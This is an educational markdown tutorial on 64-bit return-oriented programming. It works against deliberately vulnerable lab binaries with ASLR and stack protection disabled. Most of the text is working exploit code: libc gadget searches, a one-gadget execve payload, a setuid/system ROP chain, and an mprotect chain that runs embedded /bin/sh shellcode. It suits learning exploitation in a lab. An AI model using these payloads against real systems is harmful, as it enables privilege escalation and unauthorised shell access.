# 64 bit ROP

dependencies:
[Basics of ROP](first.md)

sources: \
https://en.wikipedia.org/wiki/X86-64#Virtual_address_space_details \
https://www.ret2rop.com/2018/08/return-to-libc.html \
https://en.wikipedia.org/wiki/X86_calling_conventions \
https://aaronbloomfield.github.io/pdr/book/x86-64bit-ccc-chapter.pdf \
https://reverseengineering.stackexchange.com/questions/1994/base-address-of-shared-objects-from-ldd-output \
https://reverseengineering.stackexchange.com/questions/3726/rop-exploitation-in-x86-64-linux \
https://security.stackexchange.com/questions/143719/corrupted-address-when-performing-64-bit-rop-chain \
https://www.ret2rop.com/2018/08/stack-based-buffer-overflow-x64.html \
https://en.wikipedia.org/wiki/NX_bit \
https://www.ret2rop.com/2018/08/make-stack-executable-again.html \
http://shell-storm.org/shellcode \
https://stackoverflow.com/questions/56458251/why-does-my-shellcode-crash-on-push-instructions \
https://www.voidsecurity.in/2013/08/stdin-reopen-execve-binsh-shellcode-for.html \
https://nobe4.fr/shellcode-for-by-newbie/ \

After seeing how do on 32 bit archtecture, we are ready to move on to
64 bit ROP!

This section will prove to be more challeging, but also more rewarding,
since we are moving closer and closer to understand how these attacks
are normally performed in modern applications.

## Second Easiest Scenario

### The Compilation

For this section we will use the rule `second` in the `Makefile`. to use
just type `make second` or do it manually with:

```
gcc rip.c -fno-stack-protector -o rip
gcc rip_read.c -fno-stack-protector -o rip_read

```

Also, disable ASLR with:

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## Major Differences

What do we need to watch out when doing a 64 bit ROP exploitation for the
first time?

### Addresses

In 64 bit the addresses are 64 bit wide, just like 32 bit architecture had
32 bit addresses. However, since 64 bit provide an enourmous number of
possible addresses, only 48 bytes are actually used (already enough to 
address 256 terabytes!).

That means only addresses from `0x0000 0000 0000 0000` to `0x0000 7fff ffff ffff`
are actually used, which force us to always deal with two null bytes everytime we
handle an address.

### Arguments

In 64 bits most arguments are passed through registers. We will need to somehow
load the desired arguments to a function to the right registers before calling
a function.

### Offset

Since we are not using the `-no-pie` option, our binary will contain function
independent code, which means `objdump` and other static analysis tools
won't be able to show us the exact addresses that will be used be the binary.

This is easy to overcome since we are still not using ASLR and we can just see
what addresses are used in GDB when the program is loaded.

## Plan of Attack

It is actually pretty straight forward to overwrite RIP
(not EIP anymore, remember that!) in 64 bit.

Since most systems use little-endian and usually the two MSB bytes are null
for every address, we can write the non-null part of the address to RIP.

However, this means that is really difficult to make a ROP chain, since
we would need to write two null bytes for every address we use. This means
we can't use `gets` like last time, since we would need to use `gets`
address and an address for it to nullify.

If instead of `scanf` or just a command line argument the input
function was `read`, we could write null bytes. `read` can read the
input as a file, that means that instead of reading the input as a
string, it reads it as a stream of bytes, no matter their value.

obs1.: I use `scanf` as an example here, any kind of function
that treats your input as a string should be affected the same way.

obs2.: I also use `read` as an example, any kind of function that
treats your input as a stream of bytes should be affected the same way.

That's why we have a division below: `scanf` (or command line argument)
exploits work also with `read`, but the `read` exploits only work with
`read`.

Below are some techniques to get a shell in `rip.c`, which use `scanf`
or command line arguments:

* [One Gadget to Rule Them All](#one-gadget-to-rule-them-all)

And these are the exploits to get a shell in `rip_read.c`, which use `read`:

obs.: In order to enable the `mprotect` exploit to work, the buffer size
has been increased in `rip_read.c`.

* [ROP Chain 2: Eletric Boogaloo](#rop-chain-2-eletric-boogaloo)

* [Changing The Rules Of The Game](#changing-the-rules-of-the-game)

Remember that the number of garbage bytes we will need to write to the
buffer to get to RIP may differ from 32 bit. You need to analyse the 64 bit
binary, just like we did in the
[buffer overflow](../../buffer_overflow/buffer_overflow.md) section.

## One Gadget to Rule Them All

### The Gadgets

We can get a shell by calling `system("/bin/sh")` or `execve("/bin/sh", 0, 0)`.
At first it may look harder to call `execve` due to the two null arguments,
but since all we are going to do is look for a gadget to do it for us we don't
need to worry.

First, let's see how we would call these functions in assembly to know what
we are looking for.

We can get how `system` assembly looks by using `objdump` in our 64 bit
compiled `rip`:

`system("/bin/sh")`:

```
lea    rdi,[rip+0x13d]
call   640 <system@plt>
```

As you can see, it is really simple. The address of the string "bin/sh" is
loaded to `rdi` as an argument.

For `execve` we can just write a little program like:

```
#include<unistd.h>

int main(){

	execve("/bin/sh", 0, 0);
	return 0;
}
```

And analyse with `objdump`. We can see that the assembly for `main` looks
like this:

```
edx,0x0
esi,0x0
lea    rdi,[rip+0x9f]
call   560 <execve@plt>
```

Though only the lower 32 bits of `rdx` and `rsi` are set to 0, we can't
assure that will be enough for every case. The compiler could know that
they would have the other bits set to zero before, and thus optimized
the process.

What the arguments given by `rdx` and `rsi` do is set the arguments
and environments variables used by the command given by `rdi`.

Besides that, the rest of the code is really straight forward, the
address of "/bin/sh" is loaded to `rdi` as an argument.

All we need to do now is find an gadget like the ones above that would
give us a shell. We need to look for one of these in `libc`.

### Finding "/bin/sh" again

Using `ldd rip` we can see what objects are linked to the binary when
it launches:

```
linux-vdso.so.1 (0x00007ffff7ffa000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7838000)
/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd9000)
```

As you can see, `libc` is at `/lib/x86_64-linux-gnu/libc.so.6`. The
address next to it is the address loaded when `ldd` called for the
library. Even with no ASLR, this address may be different when we
run our binary, since it depends on the loading order of the libraries.

Now we need to find the address of "/bin/sh" in `libc`. We did it
before using the `find` command in `gdb`, but we can also do it only
using static analysis.

Constant strings like "/bin/sh" are kept in the `.rodata` section.
We can find the offset of `.rodata` with:

```
readelf --sections /lib/x86_64-linux-gnu/libc.so.6 | grep rodata

```

My output was:

```
[16] .rodata           PROGBITS         000000000014a660  0014a660
```

Remember, your addresses may differ.

The last column refers to the offset of the section in the file, and
the column on its left is the address it is loaded to. Since `libc`
is a shared object, it has position independent code, so no predetermined
address for it to be loaded to (Although without ASLR it will always
be loaded to the same address).

Now we can find the offset of "/bin/sh" from the beggining of the section
with:

```
readelf -p .rodata /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```

Which for me yields:

```
[ 175b9]  /bin/sh
```

If we add `0x14a660` (`.rodata` offset within `libc`) with `0x175b9`
("/bin/sh" offset within `.rodata`) we get `0x161c19`
(offset of "/bin/sh" from the beggining of `libc`).

Obs.: We also could have gathered this result with `strings -t x
/lib/x86_64-linux-gnu/libc.so.6`.

If we added this result to the address `libc` will be loaded to
when linked (given by `ldd`) we could get which address "/bin/sh"
would be loaded to when the program is run.

However, within the `libc` code its elements are all referenced
using the offset, so we just need `0x161c19` to filter our
search for gadgets.

### Finding the Gadget

We need a gadget that calls `execve` and `system` using "/bin/sh".

We can use `grep` with `objdump` to filter our searches.

First, let's look for `system`:

```
objdump -D -M intel-mnemonic /lib/x86_64-linux-gnu/libc.so.6 | grep -B 5 "system" | grep -C 3 "161c19"
```

Besides dumping the `libc` code, this command uses `grep` to print
the 5 lines that come before `system`. The result of this search
is given to another `grep` call, that prints 3 lines before and
after the "/bin/sh" offset we found.

For my version of `libc`, nothing is found.

If we try with execve though:

```
objdump -D -M intel-mnemonic /lib/x86_64-linux-gnu/libc.so.6 | grep -B 5 "execve" | grep -C 3 "161c19"
```

I get:

```
--
b8c07:	48 89 ca             	mov    rdx,rcx
b8c0a:	e8 81 b2 fc ff       	call   83e90 <memcpy@GLIBC_2.2.5>
b8c0f:	48 8d 3d 03 90 0a 00 	lea    rdi,[rip+0xa9003]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
b8c16:	4c 89 e2             	mov    rdx,r12
b8c19:	4c 89 ee             	mov    rsi,r13
b8c1c:	e8 1f fa ff ff       	call   b8640 <execve@@GLIBC_2.2.5>
--
d6b9a:	e8 81 53 00 00       	call   dbf20 <__close@@GLIBC_2.2.5>
d6b9f:	48 8b 05 12 23 2c 00 	mov    rax,QWORD PTR [rip+0x2c2312]        # 398eb8 <__environ@@GLIBC_2.2.5-0x3080>
d6ba6:	48 8d 74 24 60       	lea    rsi,[rsp+0x60]
d6bab:	48 8d 3d 67 b0 08 00 	lea    rdi,[rip+0x8b067]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
d6bb2:	48 8b 10             	mov    rdx,QWORD PTR [rax]
d6bb5:	e8 86 1a fe ff       	call   b8640 <execve@@GLIBC_2.2.5>
```

Sucess! Now we just need to overwrite RIP with one of
the addresses.

But we only got the offsets. To get the proper addresses
we need to add the offset to the address `libc` will be
loaded to.

### Putting It All Together

We can get the address `libc` is loaded to by running with `gdb`,
breaking at some point and calling `info proc map`:

```
(gdb) info proc map
process 5827
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555555000     0x1000        0x0 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/rip
      0x555555754000     0x555555755000     0x1000        0x0 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/rip
      0x555555755000     0x555555756000     0x1000     0x1000 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/rip
      0x7ffff7a3a000     0x7ffff7bcf000   0x195000        0x0 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7bcf000     0x7ffff7dcf000   0x200000   0x195000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dcf000     0x7ffff7dd3000     0x4000   0x195000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dd3000     0x7ffff7dd5000     0x2000   0x199000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dd5000     0x7ffff7dd9000     0x4000        0x0 
      0x7ffff7dd9000     0x7ffff7dfc000    0x23000        0x0 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7fd7000     0x7ffff7fd9000     0x2000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x23000 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x24000 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

As you can see, `libc` is loaded to `0x7ffff7a3a000`. Add
this to one of gadgets offset and we got our address! If we
try `0xd6b9f` from this snippet:

```
d6b9a:	e8 81 53 00 00       	call   dbf20 <__close@@GLIBC_2.2.5>
d6b9f:	48 8b 05 12 23 2c 00 	mov    rax,QWORD PTR [rip+0x2c2312]        # 398eb8 <__environ@@GLIBC_2.2.5-0x3080>
d6ba6:	48 8d 74 24 60       	lea    rsi,[rsp+0x60]
d6bab:	48 8d 3d 67 b0 08 00 	lea    rdi,[rip+0x8b067]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
d6bb2:	48 8b 10             	mov    rdx,QWORD PTR [rax]
d6bb5:	e8 86 1a fe ff       	call   b8640 <execve@@GLIBC_2.2.5>
```

`0x7ffff7a3a000` + `0xd6b9f` = `0x7ffff7b10b9f`. With a simple
exploit like this:

```
import sys
import struct

payload = b'A' * 0x10
payload += b'BBBBBBBB'
payload += struct.pack("Q", 0x7ffff7b10b9f)

sys.stdout.buffer.write(payload)
```

We can run `./rip $( python3 second.py )` and get a shell!

Unfortunely, we can't call `setuid` to get a root
shell, but in some systems this can be enough to
get root too.

## ROP Chain 2: Eletric Boogaloo

For this exploit, we need a buffer overflow caused by a input
function that reads a number of bytes from `stdin`. This 
bytes should not be read as string (for more info check
[Plan of Attack](#plan-of-attack))

We'll be exploiting the `rip_read` binary. To generate it,
check the [compilation](#the-compilation) section.

The idea is to do a ROP chain just like we did
[in 32 bits](../first/first.md/#getting-r00t).

The differences from the 32 bits chain is that in 64 bits
the arguments are passed from registers, not the stack
and we won't need `gets` since we can write null bytes.

Just like before, the plan is to call `setuid` to get a
root shell if the binary can be run as root. After that
we call `system` to give us a shell using "/bin/sh" and
finally call `exit` to end the program gracefully.

Since the registers are used to pass arguments in 64 bits,
we need to somehow give value to a register before calling
a function.

### Getting the Pieces

If we use
`objdump -D -M intel rip_read | grep -A 7 impossible_shell`,
we can see how `system` is called by the function
`impossible_shell`:

```
0000000000000780 <impossible_shell>:
 780:	55                   	push   rbp
 781:	48 89 e5             	mov    rbp,rsp
 784:	48 8d 3d 2d 01 00 00 	lea    rdi,[rip+0x12d]        # 8b8 <_IO_stdin_used+0x8>
 78b:	e8 90 fe ff ff       	call   620 <system@plt>
 790:	90                   	nop
 791:	5d                   	pop    rbp
 792:	c3                   	ret  
```

As you can see, the argument is loaded to `rdi`. In linux
the first argument goes to `rdi`, the second to `rsi`
and the third to `rdx` (for more details check 
[here](../../assembly/stack.md/#caviats)).

Since we only control the values on the stack, a good
idea is to put the desired value for `rdi` in the stack
and `pop` it to `rdi`.

We can look for a gadget that can do it for us in `libc`.
With `ldd rip_read` we can get the `libc` path, and them
use
`objdump -D -M intel /lib/x86_64-linux-gnu/libc.so.6 | grep -B 1 ret | grep -A 1 "pop.*rdi"`:

```
  1729fd:	5f                   	pop    rdi
  1729fe:	c3                   	ret    
```

We can them catch a break in `rip_read` in `gdb` to see
where `libc` is loaded (with `info proc map`) and
them add it to the offset of `pop rdi`:

```
(gdb) info proc map
process 11292
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555555000     0x1000        0x0 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/second/rip_read
      0x555555754000     0x555555755000     0x1000        0x0 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/second/rip_read
      0x555555755000     0x555555756000     0x1000     0x1000 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/second/rip_read
      0x7ffff7a3a000     0x7ffff7bcf000   0x195000        0x0 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7bcf000     0x7ffff7dcf000   0x200000   0x195000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dcf000     0x7ffff7dd3000     0x4000   0x195000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dd3000     0x7ffff7dd5000     0x2000   0x199000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dd5000     0x7ffff7dd9000     0x4000        0x0 
      0x7ffff7dd9000     0x7ffff7dfc000    0x23000        0x0 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7fd7000     0x7ffff7fd9000     0x2000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x23000 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x24000 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

As we can see `/lib/x86_64-linux-gnu/libc-2.24.so` is
loaded to `0x7ffff7a3a000`. By adding it to `pop rdi`
offset (`1729fd`) we get `0x7ffff7bac9fd`.

Since we already got a break, we can also get the
addresses of the functions we'll be using:

```
(gdb) p setuid
$1 = {<text variable, no debug info>} 0x7ffff7af2fa0 <__setuid>
(gdb) p system
$2 = {<text variable, no debug info>} 0x7ffff7a79480 <__libc_system>
(gdb) p exit
$3 = {<text variable, no debug info>} 0x7ffff7a6f980 <__GI_exit>
```

All that is left is to find the address of "/bin/sh":

```
(gdb) find 0x7ffff7a3a000, 0x7ffff7dd5000, "/bin/sh"
0x7ffff7b9bc19
```

Now we got all the building blocks! Time to put it
all together.

Since we need to `pop rdi` before
making a function call, let's return to `pop rdi`
and put the `rdi` value right after it:

```
pop rdi + 0 + setuid + address of "/bin/sh" + system + exit
```

You can see it coded at `second_read.py`:

```
mport sys
import struct

setuid = struct.pack("Q", 0x7ffff7af2fa0)
system = struct.pack("Q", 0x7ffff7a79480)
exit = struct.pack("Q", 0x7ffff7a6f980)
bin_sh = struct.pack("Q", 0x7ffff7b9bc19)
pop_rdi = struct.pack("Q", 0x7ffff7bac9fd)
zero = struct.pack("Q", 0)

payload = b'A' * 0x10
payload += b'BBBBBBBB'
payload += pop_rdi
payload += zero
payload += setuid
payload += pop_rdi
payload += bin_sh
payload += system
payload += exit

sys.stdout.buffer.write(payload)
```

### Using the Exploit

Since `rip_read` asks for input instead of getting it
as a command line argument, we can't do
`rip_read $( python3 second_read.py )`.

However, we can't just pipe the exploit either, since
`python3 second_read.py | ./rip_read` would expect all
input ot come from the pipe, including the shell input.

A workaround for it is to pass `cat` with our exploit. The
`cat` command echo what we type for it (pass it to `rip_read`)
so it is always expecting for more input.

This way the pipe is always expecting more input, instead of
stopping after the exploit input is given.

To do so we use:

```
(python3 second_read.py; cat) | ./rip_read
```

Unfortunely, you won't receive the shell prompt, but you can
see the output of the commands you enter!

For a better input method, some python scripting may be
required.

As an exercise: you can also use the gadget used in
[One Gadget To Rule Them All](#one-gadget-to-rule-them-all)
instead of `system`.

## Changing The Rules Of The Game

Until now we worked mainly with the idea of chaining commands
through the gadgets. However, there is also another popular
concept used in ROP that consists of loading executing
assembly code to the stack and returning to it in order
to make it run.

In most tutorials and courses this is showned early on, with
even less security barriers than what we started with when
doing our [first buffer overflow](../../buffer_overflow/buffer_overflow.md).

The security barrier we didn't disable when doing our
first buffer overflow is the [NX bit](https://en.wikipedia.org/wiki/NX_bit)
(Non executable bit). This makes so the memory space
occupied by the stack can't be execute, which means
that if we returned to the stack the program
would crash.

In this section, we will execute code from the stack,
but without disabling the NX bit. How we are going to
do it? Changing the rules!

### Enter `mprotect`

This is all possible due to `mprotect`. This function
can change the permissions of a space in memory given
the address it starts, the size and what are the new
permissions.

You can see it in action by using `strace ./rip_read`:

```
execve("./rip_read", ["./rip_read"], [/* 47 vars */]) = 0
brk(NULL)                               = 0x555555756000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=126927, ...}) = 0
mmap(NULL, 126927, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ffff7fd9000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\4\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1689360, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fd7000
mmap(NULL, 3795296, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ffff7a3a000
mprotect(0x7ffff7bcf000, 2097152, PROT_NONE) = 0
mmap(0x7ffff7dcf000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x195000) = 0x7ffff7dcf000
mmap(0x7ffff7dd5000, 14688, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7dd5000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7ffff7fd8440) = 0
mprotect(0x7ffff7dcf000, 16384, PROT_READ) = 0
mprotect(0x555555754000, 4096, PROT_READ) = 0
mprotect(0x7ffff7ffc000, 4096, PROT_READ) = 0
munmap(0x7ffff7fd9000, 126927)          = 0
read(0,
```

As you can see some regions of memory are set to
be readonly of not have any permissions at all!

The function `mmap` has a similar purpose to
`mprotect`: it creates a new mapping in the virtual
address space with the given permissions and settings. It
can also be used in exploits, but is a little more
complex due to the 6 arguments we have to provide it.

If you catch a break in `gdb` and run `info proc map`,
you can see that the addresses given to `mprotect` and
`mmap` are the ones in which our program and libraries
are loaded to.

We can also make a simple program to understand how
a call to `mprotect` works:

```
#include<sys/mman.h>

int main(){

	mprotect(0, 16, PROT_EXEC | PROT_READ | PROT_WRITE);

	return 0;
}
```

By compiling it with `gcc mprotect.c -fno-stack-protector -o mprotect`
and using `objdump -D -M intel mprotect | grep -A 10 "<main>:" we get:

```
00000000000006b0 <main>:
6b0:	55                   	push   rbp
6b1:	48 89 e5             	mov    rbp,rsp
6b4:	ba 07 00 00 00       	mov    edx,0x7
6b9:	be 10 00 00 00       	mov    esi,0x10
6be:	bf 00 00 00 00       	mov    edi,0x0
6c3:	e8 98 fe ff ff       	call   560 <mprotect@plt>
6c8:	b8 00 00 00 00       	mov    eax,0x0
6cd:	5d                   	pop    rbp
6ce:	c3                   	ret    
6cf:	90                   	nop
```

As we can see, the first argument is loaded to `rdi`, the
second to `rsi` and the third to `rdx`. For more information in the
order of the registers and how function calls happen in assembly,
check [here](../../assembly/stack.md).

Just like how we did in [ROP Chain 2: Eletric Boogaloo](#rop-chain-2-eletric-boogaloo)
all we need to do is `pop` the desired arguments to the proper
registers and call `mprotect`.

However, there is a little detail we need to pay attention:
page size. To understand better why this matters, check
[here](../../../elf/layout.md/#page-size), but to explain it
briefly, a page is the smallest unit of memory you can enforce
a permissions to. To get the system's page size, use
`getconf PAGE_SIZE`. The address given to `mprotect` must
be aligned to the page size (be a multiple of it).

obs.: The size of the memory given to `mprotect` don't
need to be aligned to the page size. Any overlap between
the memory space given to `mprotect` and a page will
affect make that page be affected by the settings passed.

### Getting The Pieces

We need to find `mprotect` address, the stack starting address,
the stack ending address (or size), the addresses of the gadgets
to `pop` to the registers, and write our assembly code
(or get it from somewhere like [shell-storm](http://shell-storm.org/shellcode/)).

We can pretty easily get the addresses by catching a break
in `gdb`:

```
(gdb) p mprotect
$1 = {<text variable, no debug info>} 0x7ffff7b1e710 <mprotect>
(gdb) info proc map
process 12190
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555555000     0x1000        0x0 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/second/rip_read
      0x555555754000     0x555555755000     0x1000        0x0 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/second/rip_read
      0x555555755000     0x555555756000     0x1000     0x1000 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/second/rip_read
      0x7ffff7a3a000     0x7ffff7bcf000   0x195000        0x0 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7bcf000     0x7ffff7dcf000   0x200000   0x195000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dcf000     0x7ffff7dd3000     0x4000   0x195000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dd3000     0x7ffff7dd5000     0x2000   0x199000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dd5000     0x7ffff7dd9000     0x4000        0x0 
      0x7ffff7dd9000     0x7ffff7dfc000    0x23000        0x0 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7fd7000     0x7ffff7fd9000     0x2000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x23000 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x24000 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

In the output of `info proc map` we can see the addresses of `stack`:

```
          Start Addr           End Addr       Size     Offset objfile
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
```

You can check your page size in Linux with `getconf PAGE_SIZE`. Mine
is 4096 (`0x1000` in hex). That means that both stack addresses are
multiple of the page size and so is the size.

Now let's find the gadgets with some `objdump` searches. Get
`libc` path with `ldd rip_read`:

```
	linux-vdso.so.1 (0x00007ffff7ffa000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7838000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd9000)
```

Look for `pop rdi; ret` with `objdump -D -M intel /lib/x86_64-linux-gnu/libc.so.6 | grep -B 1 "ret" | grep -A 1 "pop.*rdi"`:

```
  1729fd:	5f                   	pop    rdi
  1729fe:	c3                   	ret    
```

Now, `pop rsi; ret` with `objdump -D -M intel /lib/x86_64-linux-gnu/libc.so.6 | grep -B 1 "ret" | grep -A 1 "pop.*rsi"`:

```
   f54fa:	5e                   	pop    rsi
   f54fb:	c3                   	ret 
```

And finally, `pop rdx; ret` with `objdump -D -M intel /lib/x86_64-linux-gnu/libc.so.6 | grep -B 1 "ret" | grep -A 1 "pop.*rdx"`:

```
```

We got nothing! Let's try to find longer gadgets that have `pop rdx` with
`objdump -D -M intel /lib/x86_64-linux-gnu/libc.so.6 | grep -B 2 "ret" | grep -A 2 "pop.*rdx"`:

```
   f54f9:	5a                   	pop    rdx
   f54fa:	5e                   	pop    rsi
   f54fb:	c3                   	ret   
```

Great! We can use this one to `pop` both `rdx` and `rsi`.

What we need to do now is write the assembly code. Alternatively, you
can look for shellcodes online (there are a bunch). I am going with
this shell [here](https://www.voidsecurity.in/2013/08/stdin-reopen-execve-binsh-shellcode-for.html),
which takes care of closing and reopening `stdin`
(sometimes it doesn't work without doing so).

All that is left is to find the address the shellcode will be located. We
can calculate it by getting the address of `rbp` at `password_is_correct`:

```
(gdb) break password_is_correct 
Breakpoint 1 at 0x797
(gdb) run
Starting program: /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/second/rip_read 

Breakpoint 1, 0x0000555555554797 in password_is_correct ()
(gdb) p $rbp
$1 = (void *) 0x7fffffffe070
(gdb) 
```

add 8 (the size of the address `rbp` is pointing to) to `rbp` and
then add the size of the rest of the payload until you reach the shellcode.

### Putting It All Together

At the end our payload should look somewhat like this:

```
shellcode + some 'A's + 'BBBBBBBB' + pop rdi + stack starting address + pop rdx; pop rsi + PROT_WRITE | PROT_READ | PROT_EXEC (7) + stack memory region size + mprotect + shellcode address
```

The entire shellcode is contained inside the buffer, and we
add a bunch o 'A's in order to fill the rest of it.

In `second_read.py` you can see a code snippet that creates
the payload:

```
mprotect = struct.pack("Q", 0x7ffff7b1e710)
pop_rdi = struct.pack("Q", libc + 0x1729fd)
pop_rdx_rsi = struct.pack("Q", libc + 0xf54f9)
stack_address = struct.pack("Q", 0x7ffffffde000)
stack_size = struct.pack("Q", 0x21000)
permissions = struct.pack("Q", 0x7)
shellcode_address = struct.pack("Q", rbp - 0x80)

shellcode = b'\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05'

payload = shellcode
payload += b'A' * ( 0x80 - len(shellcode) )
payload += b'BBBBBBBB'
payload += pop_rdi
payload += stack_address
payload += pop_rdx_rsi
payload += permissions
payload += stack_size
payload += mprotect
payload += shellcode_address
```

We can see it working with `python3 second_read.py | ./rip_read`.

obs.: If it doesn't work, try attaching `gdb` to an already
running process to debug. While making this exploit i kept
failing due to `rbp` value being different from inside and
outside `gdb`.

### Making The Exploit Work On More Secure Systems

In some systems, even after twiking the payload
script properly, the exploit may not work. That
is because of a security feature that don't allow
pages to have permission to write and execute
at the same time.

To workaround this, we need to copy our exploit
to another page (with write permission) and then
make it executable.

If we run `strace ./rip_read` we can see some
`mmap` calls when the program is setting up. From 
these calls we can see which memory addresses
have write permissions:

```
mmap(0x7ffff7dd5000, 14688, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7dd5000
```

Let's try using this one. You can see what each
flag mean using `man mmap`.

To copy the shellcode, we just need to use
the `memcpy` function. It takes three
arguments: an address for the destination,
an address to the source and the number of bytes
to copy.

The only piece left to get is the `mempcy`
address. Just catch a break in `gdb` and get
it like we did with `mprotect`.

In the end, our payload will look like this:

```
shellcode + some 'A's + 'BBBBBBBB' + pop rdi + stack starting address + pop rdx; pop rsi + shellcode size + shellcode address + memcpy + pop rdx; pop rsi + PROT_EXEC + stack address + mprotect + stack address (where the copied shellcode is)
```

Mind that we don't `pop rdi` a second time since we don't
need to change its value. The value of `rdx` also don't
have to change, but since we are forced to call it's gadget
to give a value to `rsi`, we give it the same value.

obs.: If this doesn't work for you, try creating
a simple program that calls `memcpy` and where
`memcpy@plt` end jumping to. In my case i ended up calling
`__memmove_avx_unaligned_erms` since thats what is
called instead of the `memcpy` function.
